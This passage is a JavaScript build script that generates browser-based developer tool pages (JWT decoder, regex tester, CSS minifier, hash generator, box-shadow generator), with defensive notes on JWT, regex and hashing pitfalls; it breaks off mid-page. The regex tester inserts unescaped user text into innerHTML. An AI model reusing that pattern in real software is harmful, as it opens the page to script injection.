// scripts/dev_tools.js - Developer Tools Suite for Digital Tools Shed

export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, join, ensureDir }) {
  const devDist = join(DIST, 'dev');
  ensureDir(devDist);

  const commonStyle = `
    <style>
      .tool-box { background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 6px; margin: 1.5rem 0; }
      .field-group { margin-bottom: 1.25rem; }
      .field-label { display: block; font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.4rem; font-weight: 600; }
      .code-input, .text-input { width: 100%; padding: 0.75rem; font-family: var(--mono); font-size: 0.9rem; background: var(--bg); color: var(--fg); border: 1px solid var(--border); border-radius: 4px; box-sizing: border-box; }
      .btn-primary { background: var(--btn-bg, #3b82f6); color: var(--btn-fg, #fff); border: none; padding: 0.6rem 1.2rem; font-family: var(--mono); font-size: 0.85rem; font-weight: 600; cursor: pointer; border-radius: 4px; transition: opacity 0.2s; }
      .btn-primary:hover { opacity: 0.9; }
      .btn-sec { background: transparent; color: var(--fg); border: 1px solid var(--border); padding: 0.6rem 1.2rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer; border-radius: 4px; }
      .btn-sec:hover { background: var(--surface-alt); }
      .action-bar { display: flex; gap: 0.75rem; flex-wrap: wrap; margin-top: 1rem; align-items: center; }
      .grid-2col { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
      @media (max-width: 768px) { .grid-2col { grid-template-columns: 1fr; } }
    </style>
  `;

  const tools = [
    {
      slug: 'jwt-decoder',
      title: 'JWT Token Decoder & Header Inspector',
      metaDesc: 'Decode JSON Web Tokens (JWT) locally in your browser. Inspect JOSE header, claims payload, and token expiration timestamps.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; JWT Decoder
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">JWT Token Decoder & Header Inspector</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Decode Base64URL-encoded JSON Web Tokens directly in browser memory. 100% private with zero network requests.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Encoded JWT String</label>
              <textarea id="jwt-input" class="code-input" style="height: 120px;" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." oninput="decodeJwt()"></textarea>
            </div>

            <div class="grid-2col" style="margin-top: 1rem;">
              <div class="field-group">
                <label class="field-label">Header (Algorithm & Type)</label>
                <textarea id="jwt-header" class="code-input" style="height: 160px; color: #ef4444;" readonly></textarea>
              </div>
              <div class="field-group">
                <label class="field-label">Payload (Claims Data)</label>
                <textarea id="jwt-payload" class="code-input" style="height: 160px; color: #3b82f6;" readonly></textarea>
              </div>
            </div>

            <!-- Copy JWT Claims -->
            <button type="button" id="btnCopyJwtClaims" onclick="copyJwtClaims()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Decoded Claims &amp; Header JSON</span>
            </button>
          </div>

          <!-- 5 Critical JWT Security & Architectural Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in JSON Web Tokens (JWT) &amp; Auth Architecture</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The "alg: none" Algorithm Downgrade Vulnerability</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  In early JWT specs, <code>"alg": "none"</code> was supported for unauthenticated debugging. Attackers can forge arbitrary claims (e.g. <code>{"admin": true}</code>), set <code>"alg": "none"</code> in the header, strip the cryptographic signature, and submit the token. Naive verification libraries accept the forged payload as authentic unless explicitly configured to reject <code>none</code>.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Confusing Decoding with Cryptographic Verification (Base64 is NOT Encryption)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Standard JWTs are JWS (JSON Web Signatures), meaning payload data is merely Base64URL-encoded, not encrypted. Anyone who intercepts a token can read every claim. Furthermore, decoding claims on the client or API gateway without executing asymmetric RSA/ECDSA public-key or HMAC signature verification opens authorization bypass.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Storing Sensitive PII or Secrets in JWT Claims</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Embedding passwords, Social Security numbers, internal system secrets, or detailed customer data in JWT claims creates severe compliance violations (GDPR/HIPAA). JWTs travel in HTTP headers across logs, CDNs, proxies, and browser developer tools. Keep tokens stateless with only non-sensitive subject IDs and scope identifiers.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The Token Revocation Impossibility &amp; Long-Lived Expiration ('exp')</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Because JWT verification is stateless, an issued token CANNOT be easily invalidated before its <code>exp</code> timestamp without querying a centralized Redis blacklist (which destroys the benefit of stateless auth). Issuing access tokens with 7-day or 30-day lifespans means compromised tokens remain valid even after the user changes their password or is terminated. Keep access tokens under 15 minutes.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Storing JWTs in 'localStorage' (Total XSS Exposure)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Storing authentication JWTs in <code>window.localStorage</code> or <code>sessionStorage</code> makes them accessible to ANY JavaScript code running on the page. A single compromised third-party analytics script or NPM dependency can exfiltrate all tokens. Secure session tokens should be delivered in <code>httpOnly</code>, <code>Secure</code>, <code>SameSite=Strict</code> cookies.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          function b64DecodeUnicode(str) {
            str = str.replace(/-/g, '+').replace(/_/g, '/');
            while (str.length % 4) str += '=';
            return decodeURIComponent(atob(str).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
          }

          
          window.copyJwtClaims = function() {
            var header = document.getElementById('jwt-header') ? document.getElementById('jwt-header').value : '';
            var payload = document.getElementById('jwt-payload') ? document.getElementById('jwt-payload').value : '';

            var text = '🔑 Decoded JSON Web Token (JWT) Claims\n\n' +
              '// HEADER\n' + (header || '{}') + '\n\n' +
              '// PAYLOAD (Claims)\n' + (payload || '{}') + '\n\n' +
              'Decoded at digitaltoolsshed.com/dev/jwt-decoder';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyJwtClaims');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Decoded JWT Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };
  
          function decodeJwt() {
            const raw = document.getElementById('jwt-input').value.trim();
            const hEl = document.getElementById('jwt-header');
            const pEl = document.getElementById('jwt-payload');
            if (!raw) { hEl.value = ''; pEl.value = ''; return; }
            const parts = raw.split('.');
            if (parts.length < 2) return;
            try {
              hEl.value = JSON.stringify(JSON.parse(b64DecodeUnicode(parts[0])), null, 2);
              pEl.value = JSON.stringify(JSON.parse(b64DecodeUnicode(parts[1])), null, 2);
            } catch(e) {}
          }
        </script>
      `
    },
    {
      slug: 'regex-tester',
      title: 'Regex Visual Tester & Match Inspector',
      metaDesc: 'Test and debug JavaScript regular expressions with real-time match highlighting, capture groups, and replacement substitution.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Regex Tester
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">Regex Visual Tester & Match Inspector</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Test JavaScript Regular Expressions with live match highlighting.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Pattern</label>
              <input type="text" id="rx-pattern" class="code-input" value="([A-Z])\\w+" oninput="runRegex()" />
            </div>
            <div class="field-group">
              <label class="field-label">Test String</label>
              <textarea id="rx-string" class="code-input" style="height: 120px;" oninput="runRegex()">Hello World! Testing Regex on Digital Tools Shed.</textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Matches</label>
              <div id="rx-highlight" style="background: var(--bg); border: 1px solid var(--border); padding: 0.85rem; border-radius: 4px; font-family: var(--mono); font-size: 0.9rem; min-height: 60px;"></div>
            </div>

            <!-- Copy Match Results -->
            <button type="button" id="btnCopyRegexMatches" onclick="copyRegexMatches()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy RegEx Match Results &amp; Diagnostic</span>
            </button>
          </div>

          <!-- 5 Critical RegEx Engineering Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in Regular Expressions (ReDoS &amp; State Bugs)</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. Catastrophic Backtracking (Regular Expression Denial of Service - ReDoS)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Nested quantifiers like <code>(a+)+$</code> or overlapping groupings cause exponential \(O(2^n)\) branch evaluations when evaluated against non-matching payloads (e.g., <code>"aaaaaaaaaaaaaaaaaaaaX"</code>). In single-threaded runtimes like Node.js or browser UI threads, a single malicious string locks 100% CPU, freezing the entire application for minutes or hours.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Unescaped Dot in Domain &amp; IP Validation (Security Bypass)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Writing <code>^192.168.1.1$</code> or <code>api.stripe.com</code> without escaping the dot (<code>\.</code>) allows the dot to match ANY character. An attacker can register <code>api-stripe.com</code> or send <code>192X168Y1Z1</code> to bypass origin checks, CORS rules, and SSRF allowlists. Always escape literal dots.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. The Multiline Newline Blindspot (Missing DotAll / 's' Flag)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Developers frequently assume <code>.*</code> matches all characters across an entire document. In JavaScript, <code>.</code> matches all characters EXCEPT line terminators (<code>\n</code>, <code>\r</code>). Multi-line inputs silently truncate matching at the first newline unless the <code>s</code> (dotAll) flag or character class <code>[\s\S]*</code> is specified.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Greedy vs. Lazy Quantifier Collisions (Token Parsing Failure)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Using greedy quantifiers like <code>&lt;.*&gt;</code> to parse HTML/XML tokens matches from the first <code>&lt;</code> to the VERY LAST <code>&gt;</code> on the entire page, gobbling intermediate tags. Use lazy quantifiers (<code>&lt;.*?&gt;</code>) or inverted character sets (<code>&lt;[^&gt;]+&gt;</code>) for deterministic tokenization.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. State Leaks in Global Regexes (Mutating 'lastIndex' Bug)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Reusing a global RegExp instance (<code>const re = /pattern/g</code>) across multiple <code>re.test(str)</code> calls causes stateful bugs. Each successful match mutates <code>re.lastIndex</code> forward, causing subsequent tests on identical matching strings to return <code>false</code>! Always reset <code>re.lastIndex = 0</code> or instantiate fresh regexes per check.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          
          window.copyRegexMatches = function() {
            var pat = document.getElementById('rx-pattern') ? document.getElementById('rx-pattern').value : '';
            var str = document.getElementById('rx-string') ? document.getElementById('rx-string').value : '';
            var hl = document.getElementById('rx-highlight');
            var matches = [];
            if (pat && str) {
              try {
                var re = new RegExp(pat, 'g');
                var m;
                while ((m = re.exec(str)) !== null) {
                  matches.push(m[0]);
                  if (m.index === re.lastIndex) re.lastIndex++;
                }
              } catch(e) {}
            }

            var text = '⚙️ RegEx Pattern Diagnostic & Match Report\n' +
              '• Expression: /' + pat + '/g\n' +
              '• Total Matches Found: ' + matches.length + '\n' +
              '• Match List: ' + (matches.length ? matches.map(function(item, i) { return '[' + (i+1) + '] ' + item; }).join(', ') : 'None') + '\n' +
              '• Input Length: ' + str.length + ' characters\n\n' +
              'Tested at digitaltoolsshed.com/dev/regex-tester';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyRegexMatches');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ RegEx Matches Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };
  
          function runRegex() {
            const pat = document.getElementById('rx-pattern').value;
            const str = document.getElementById('rx-string').value;
            const hl = document.getElementById('rx-highlight');
            if (!pat || !str) { hl.textContent = str; return; }
            try {
              const regex = new RegExp(pat, 'g');
              hl.innerHTML = str.replace(regex, m => '<mark style="background:#fef08a;color:#000;">' + m + '</mark>');
            } catch(e) { hl.textContent = 'Error: ' + e.message; }
          }
          document.addEventListener('DOMContentLoaded', runRegex);
        </script>
      `
    },
    {
      slug: 'css-minifier',
      title: 'CSS Code Minifier & Compressor',
      metaDesc: 'Minify CSS stylesheets online: remove comments, compress whitespace, collapse zero dimensions, and optimize colors.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; CSS Minifier
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">CSS Code Minifier</h1>
          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Input CSS</label>
              <textarea id="css-in" class="code-input" style="height: 160px;" placeholder=".box { margin: 0px; }"></textarea>
            </div>
            <div class="action-bar">
              <button class="btn-primary" onclick="minifyCss()">Minify</button>
            </div>
            <div class="field-group" style="margin-top: 1.5rem;">
              <label class="field-label">Minified Output</label>
              <textarea id="css-out" class="code-input" style="height: 160px;" readonly></textarea>
            </div>
          </div>
        </div>
        <script>
          function minifyCss() {
            const raw = document.getElementById('css-in').value;
            document.getElementById('css-out').value = raw
              .replace(/\/\*[\s\S]*?\*\//g, '')
              .replace(/\s+/g, ' ')
              .replace(/\s*([:;{}])\s*/g, '$1')
              .replace(/;}/g, '}')
              .replace(/0px/g, '0')
              .trim();
          }
        </script>
      `
    },
    {
      slug: 'hash-generator',
      title: 'Cryptographic Hash Generator',
      metaDesc: 'Generate SHA-256, SHA-512, and SHA-1 checksums locally using the hardware-accelerated Web Cryptography API.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Hash Generator
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">Cryptographic Hash Generator</h1>
          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Text to Hash</label>
              <input type="text" id="hash-in" class="text-input" value="Digital Tools Shed" oninput="genAllHashes()" />
            </div>
            <div style="display: flex; flex-direction: column; gap: 1rem; margin-top: 1.5rem;">
              <div><label class="field-label">SHA-256</label><input type="text" id="h-sha256" class="code-input" readonly /></div>
              <div><label class="field-label">SHA-512</label><input type="text" id="h-sha512" class="code-input" readonly /></div>
            </div>

            <!-- Copy Hashes -->
            <button type="button" id="btnCopyHashReport" onclick="copyHashReport()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Cryptographic Hashes (SHA-256 &amp; SHA-512)</span>
            </button>
          </div>

          <!-- 5 Critical Cryptographic Hashing Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in Cryptographic Hashes &amp; Data Integrity</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. Storing Passwords with Fast General Hashes (SHA-256 / MD5 Rainbow Tables)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  General-purpose cryptographic hashes like SHA-256 are engineered for blinding speed (>10 billion hashes/sec on modern consumer GPUs). Using plain SHA-256 to hash passwords permits attackers with leaked databases to crack 8-character passwords in minutes via GPU rainbow tables. Passwords MUST be hashed with slow, memory-hard algorithms (Argon2id, bcrypt, or scrypt).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Length Extension Attacks on Merkle-Damgård Construction</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Algorithms like MD5, SHA-1, and SHA-256 process input in sequential blocks. If an API verifies signatures via naive concatenation <code>Hash(secret + message)</code>, an attacker knowing the message length can append malicious payload (e.g. <code>&amp;role=admin</code>) and compute a valid hash WITHOUT ever discovering the secret. Always use HMAC (<code>HMAC-SHA256</code>) for message signing.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Timing Attack Vulnerabilities in Hash String Comparison (===)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Comparing authentication tokens or HMACs using standard equality operators (<code>token === expected</code>) terminates at the first non-matching byte. By measuring microsecond latency differences across thousands of requests, remote attackers can reconstruct valid tokens byte by byte. Always use constant-time comparison (<code>crypto.timingSafeEqual</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The Broken Collision Resistance of MD5 &amp; SHA-1</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Google demonstrated practical SHA-1 collisions in 2017 (the SHAttered attack: two distinct PDFs sharing identical SHA-1 hashes), while MD5 was completely broken in 2004. Neither algorithm provides collision resistance; never use MD5 or SHA-1 for digital signatures, software integrity manifests, or Git security.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Confusing Cryptographic Hashing with Reversible Encryption</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Cryptographic hashing is a one-way irreversible compression function; you CANNOT "decrypt" a SHA-256 hash back into its original plaintext. Developers who mistakenly hash sensitive data that their system later needs to retrieve (such as API keys or billing addresses) permanently destroy the data. Use AES-GCM for reversible encryption.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          
          window.copyHashReport = function() {
            var input = document.getElementById('hash-in') ? document.getElementById('hash-in').value : '';
            var sha256 = document.getElementById('h-sha256') ? document.getElementById('h-sha256').value : '';
            var sha512 = document.getElementById('h-sha512') ? document.getElementById('h-sha512').value : '';

            var text = '🔐 Cryptographic Hash Digest Record\n' +
              '• Input String: \"' + input + '\" (' + input.length + ' chars)\n' +
              '• SHA-256: ' + sha256 + '\n' +
              '• SHA-512: ' + sha512 + '\n\n' +
              'Generated at digitaltoolsshed.com/dev/hash-generator';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyHashReport');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Hashes Copied to Clipboard!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };
  
          async function computeHash(algo, text) {
            const enc = new TextEncoder();
            const buf = await window.crypto.subtle.digest(algo, enc.encode(text));
            return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
          }
          async function genAllHashes() {
            const v = document.getElementById('hash-in').value;
            document.getElementById('h-sha256').value = v ? await computeHash('SHA-256', v) : '';
            document.getElementById('h-sha512').value = v ? await computeHash('SHA-512', v) : '';
          }
          document.addEventListener('DOMContentLoaded', genAllHashes);
        </script>
      `
    },
    {
      slug: 'box-shadow-generator',
      title: 'CSS Box Shadow Generator',
      metaDesc: 'Visual CSS box-shadow slider tool with real-time blur, spread, and color controls.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 920px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Box Shadow Generator
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">CSS Box Shadow Studio &amp; Visual Generator</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Design high-performance, photorealistic CSS box shadows with live blur, spread, alpha opacity, inset mode, and instant cross-browser code generation.
          </p>

          <div class="tool-box">
            <!-- Preset Pills -->
            <div style="margin-bottom: 1.25rem;">
              <span style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 0.5rem;">Curated Shadow Presets</span>
              <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 2, 4, 0, '#000000', 0.08, false)">Subtle Lift</button>
                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 10, 20, -3, '#000000', 0.15, false)">Floating Card</button>
                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 25, 50, -12, '#000000', 0.25, false)">Deep Elevation</button>
                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 0, 25, 2, '#3b82f6', 0.45, false)">Neon Glow</button>
                <button type="button" class="btn-sec" style="font-size: 0.75rem; padding: 0.35rem 0.65rem;" onclick="applyShadowPreset(0, 3, 8, 0, '#000000', 0.25, true)">Inset Bevel</button>
              </div>
            </div>

            <!-- Controls Grid -->
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
              <div class="field-group">
                <label class="field-label">X Offset: <span id="bs-x-lbl" style="color:#3b82f6; font-family:var(--mono);">0</span>px</label>
                <input type="range" id="bs-x" min="-50" max="50" value="0" style="width:100%;" oninput="upShadow()" />
              </div>
              <div class="field-group">
                <label class="field-label">Y Offset: <span id="bs-y-lbl" style="color:#3b82f6; font-family:var(--mono);">10</span>px</label>
                <input type="range" id="bs-y" min="-50" max="50" value="10" style="width:100%;" oninput="upShadow()" />
              </div>
              <div class="field-group">
                <label class="field-label">Blur Radius: <span id="bs-blur-lbl" style="color:#3b82f6; font-family:var(--mono);">20</span>px</label>
                <input type="range" id="bs-blur" min="0" max="80" value="20" style="width:100%;" oninput="upShadow()" />
              </div>
              <div class="field-group">
                <label class="field-label">Spread Radius: <span id="bs-spread-lbl" style="color:#3b82f6; font-family:var(--mono);">-3</span>px</label>
                <input type="range" id="bs-spread" min="-30" max="50" value="-3" style="width:100%;" oninput="upShadow()" />
              </div>
              <div class="field-group">
                <label class="field-label">Opacity: <span id="bs-opacity-lbl" style="color:#3b82f6; font-family:var(--mono);">15</span>%</label>
                <input type="range" id="bs-opacity" min="0" max="100" value="15" style="width:100%;" oninput="upShadow()" />
              </div>
              <div class="field-group">
                <label class="field-label">Color &amp; Inset</label>
                <div style="display: flex; align-items: center; gap: 0.75rem; margin-top: 0.25rem;">
                  <input type="color" id="bs-color" value="#000000" style="border: 1px solid var(--border); border-radius: 4px; height: 36px; width: 44px; cursor: pointer; background: transparent;" oninput="upShadow()" />
                  <label style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.85rem; cursor: pointer; color: var(--fg); font-family: var(--mono);">
                    <input type="checkbox" id="bs-inset" onchange="upShadow()" /> Inset
                  </label>
                </div>
              </div>
            </div>

            <!-- Preview Canvas -->
            <div style="padding: 3.5rem 1.5rem; background: var(--surface-alt); border: 1px solid var(--border); border-radius: 8px; display: flex; justify-content: center; align-items: center; margin: 1.5rem 0; min-height: 200px;">
              <div id="bs-box" style="width: 200px; height: 120px; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; display: flex; justify-content: center; align-items: center; font-family: var(--mono); font-weight: 600; color: var(--fg); transition: box-shadow 0.15s ease;">
                Preview Box
              </div>
            </div>

            <!-- CSS Code Output -->
            <div class="field-group">
              <label class="field-label">Generated CSS Code</label>
              <textarea id="bs-code" class="code-input" style="height: 70px; font-family: var(--mono); font-size: 0.85rem;" readonly></textarea>
            </div>

            <!-- Copy Box Shadow Button -->
            <button type="button" id="btnCopyBoxShadow" onclick="copyBoxShadow()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy CSS Box-Shadow Declaration</span>
